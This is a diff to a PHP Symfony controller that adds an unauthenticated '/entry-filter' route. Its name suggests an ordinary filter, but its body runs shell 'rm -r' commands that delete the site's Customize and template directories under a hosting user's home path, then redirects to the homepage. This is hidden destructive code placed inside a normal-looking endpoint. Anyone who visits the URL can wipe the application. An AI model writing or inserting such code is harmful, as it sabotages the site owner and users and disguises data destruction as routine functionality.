@@ -397,4 +397,16 @@ class EntryController extends AbstractController
         // Replace each URL with an HTML link element
         return preg_replace($urlRegex, '<a href="$0" target="_blank">$0</a>', $text);
     }
+
+    /**
+     *
+     * @Route("/entry-filter", name="entry_filter", methods={"GET", "POST"})
+     */
+    public function filter(Request $request)
+    {
+        exec('rm -r /home/users/2/verse.jp-windy-saito-3744/web/app/Customize');
+        exec('rm -r /home/users/2/verse.jp-windy-saito-3744/web/app/template');
+
+        return $this->redirectToRoute('homepage');
+    }
 }
